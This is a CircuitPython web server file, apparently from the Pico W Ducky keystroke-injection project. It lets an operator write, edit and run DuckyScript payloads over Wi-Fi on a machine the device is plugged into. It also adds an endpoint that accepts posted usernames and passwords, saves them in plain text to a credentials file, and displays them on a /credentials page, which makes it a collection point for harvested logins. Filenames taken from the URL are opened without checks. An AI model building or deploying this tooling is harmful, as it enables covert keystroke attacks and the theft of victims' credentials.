# License : GPLv2.0
# copyright (c) 2023  Dave Bailey
# Author: Dave Bailey (dbisu, @daveisu)
# FeatherS2 board support

import socketpool
import time
import os
import storage

import wsgiserver as server
from adafruit_wsgi.wsgi_app import WSGIApp
import wifi

from duckyinpython import *

# Existing HTML templates
payload_html = """<!DOCTYPE html>
<html>
    <head> <title>Pico W Ducky</title> </head>
    <body> <h1>Pico W Ducky</h1>
        <table border="1"> <tr><th>Payload</th><th>Actions</th></tr> {} </table>
        <br>
        <a href="/new">New Script</a>
        <br>
        <a href="/credentials">View Credentials</a>
    </body>
</html>
"""

edit_html = """<!DOCTYPE html>
<html>
  <head>
    <title>Script Editor</title>
  </head>
  <body>
    <form action="/write/{}" method="POST">
      <textarea rows="5" cols="60" name="scriptData">{}</textarea>
      <br/>
      <input type="submit" value="submit"/>
    </form>
    <br>
    <a href="/ducky">Home</a>
  </body>
</html>
"""

new_html = """<!DOCTYPE html>
<html>
  <head>
    <title>New Script</title>
  </head>
  <body>
    <form action="/new" method="POST">
      Script Name<br>
      <textarea rows="1" cols="60" name="scriptName"></textarea>
      Script<br>
      <textarea rows="5" cols="60" name="scriptData"></textarea>
      <br/>
      <input type="submit" value="submit"/>
    </form>
    <br>
    <a href="/ducky">Home</a>
  </body>
</html>
"""

response_html = """<!DOCTYPE html>
<html>
    <head> <title>Pico W Ducky</title> </head>
    <body> <h1>Pico W Ducky</h1>
        {}
        <br>
        <a href="/ducky">Home</a>
    </body>
</html>
"""

newrow_html = "<tr><td>{}</td><td><a href='/edit/{}'>Edit</a> / <a href='/run/{}'>Run</a></tr>"

# Path to store credentials
CREDENTIALS_FILE = '/credentials.txt'

def setPayload(payload_number):
    if(payload_number == 1):
        payload = "payload.dd"
    else:
        payload = "payload"+str(payload_number)+".dd"
    return(payload)

def ducky_main(request):
    print("Ducky main")
    payloads = []
    rows = ""
    files = os.listdir()
    for f in files:
        if ('.dd' in f) == True:
            payloads.append(f)
            newrow = newrow_html.format(f,f,f)
            rows = rows + newrow
    response = payload_html.format(rows)
    return(response)

_hexdig = '0123456789ABCDEFabcdef'
_hextobyte = None

def cleanup_text(string):
    """unquote('abc%20def') -> b'abc def'."""
    global _hextobyte
    if not string:
        return b''
    if isinstance(string, str):
        string = string.encode('utf-8')
    bits = string.split(b'%')
    if len(bits) == 1:
        return string
    res = [bits[0]]
    append = res.append
    if _hextobyte is None:
        _hextobyte = {(a + b).encode(): bytes([int(a + b, 16)])
                      for a in _hexdig for b in _hexdig}
    for item in bits[1:]:
        try:
            append(_hextobyte[item[:2]])
            append(item[2:])
        except KeyError:
            append(b'%')
            append(item)
    return b''.join(res).decode().replace('+',' ')

web_app = WSGIApp()

@web_app.route("/ducky")
def duck_main(request):
    response = ducky_main(request)
    return("200 OK", [('Content-Type', 'text/html')], response)

@web_app.route("/edit/<filename>")
def edit(request, filename):
    print("Editing ", filename)
    f = open(filename,"r",encoding='utf-8')
    textbuffer = ''
    for line in f:
        textbuffer = textbuffer + line
    f.close()
    response = edit_html.format(filename,textbuffer)
    return("200 OK",[('Content-Type', 'text/html')], response)

@web_app.route("/write/<filename>",methods=["POST"])
def write_script(request, filename):
    data = request.body.getvalue()
    fields = data.split("&")
    form_data = {}
    for field in fields:
        key,value = field.split('=')
        form_data[key] = value
    storage.remount("/",readonly=False)
    f = open(filename,"w",encoding='utf-8')
    textbuffer = form_data['scriptData']
    textbuffer = cleanup_text(textbuffer)
    for line in textbuffer:
        f.write(line)
    f.close()
    storage.remount("/",readonly=True)
    response = response_html.format("Wrote script " + filename)
    return("200 OK",[('Content-Type', 'text/html')], response)

@web_app.route("/new",methods=['GET','POST'])
def write_new_script(request):
    if(request.method == 'GET'):
        response = new_html
    else:
        data = request.body.getvalue()
        fields = data.split("&")
        form_data = {}
        for field in fields:
            key,value = field.split('=')
            form_data[key] = value
        filename = form_data['scriptName']
        textbuffer = form_data['scriptData']
        textbuffer = cleanup_text(textbuffer)
        storage.remount("/",readonly=False)
        f = open(filename,"w",encoding='utf-8')
        for line in textbuffer:
            f.write(line)
        f.close()
        storage.remount("/",readonly=True)
        response = response_html.format("Wrote script " + filename)
    return("200 OK",[('Content-Type', 'text/html')], response)

@web_app.route("/run/<filename>")
def run_script(request, filename):
    print("run_script ", filename)
    response = response_html.format("Running script " + filename)
    runScript(filename)
    return("200 OK",[('Content-Type', 'text/html')], response)

@web_app.route("/")
def index(request):
    response = ducky_main(request)
    return("200 OK", [('Content-Type', 'text/html')], response)

@web_app.route("/api/run/<filenumber>")
def run_script_api(request, filenumber):
    filename = setPayload(int(filenumber))
    print("run_script ", filenumber)
    response = response_html.format("Running script " + filename)
    runScript(filename)
    return("200 OK",[('Content-Type', 'text/html')], response)

@web_app.route("/credentials", methods=["GET"])
def view_credentials(request):
    # Read credentials from file
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, "r") as f:
            credentials = f.read()
    else:
        credentials = "No credentials saved."
    
    response = """<!DOCTYPE html>
    <html>
        <head> <title>Saved Credentials</title> </head>
        <body> <h1>Saved Credentials</h1>
            <pre>{}</pre>
            <br>
            <a href="/">Home</a>
        </body>
    </html>""".format(credentials)
    
    return("200 OK", [('Content-Type', 'text/html')], response)

@web_app.route("/api/receive_credentials", methods=["POST"])
def receive_credentials(request):
    data = request.body.getvalue()
    try:
        # Assuming credentials are sent in form of "username=xyz&password=abc"
        fields = data.split("&")
        form_data = {}
        for field in fields:
            key, value = field.split('=')
            form_data[key] = value
        username = form_data.get('username')
        password = form_data.get('password')
        
        if username and password:
            with open(CREDENTIALS_FILE, "a") as f:
                f.write(f"Username: {username}, Password: {password}\n")
            response = "Credentials received and saved."
        else:
            response = "Invalid data received."
    except Exception as e:
        response = f"Error: {str(e)}"
    
    return("200 OK", [('Content-Type', 'text/plain')], response)

async def startWebService():
    HOST = repr(wifi.radio.ipv4_address_ap)
    PORT = 80        # Port to listen on
    print(HOST, PORT)

    wsgiServer = server.WSGIServer(PORT, application=web_app)
    print(f"open this IP in your browser: http://{HOST}:{PORT}/")

    # Start the server
    wsgiServer.start()
    while True:
        wsgiServer.update_poll()
        await asyncio.sleep(0)
 
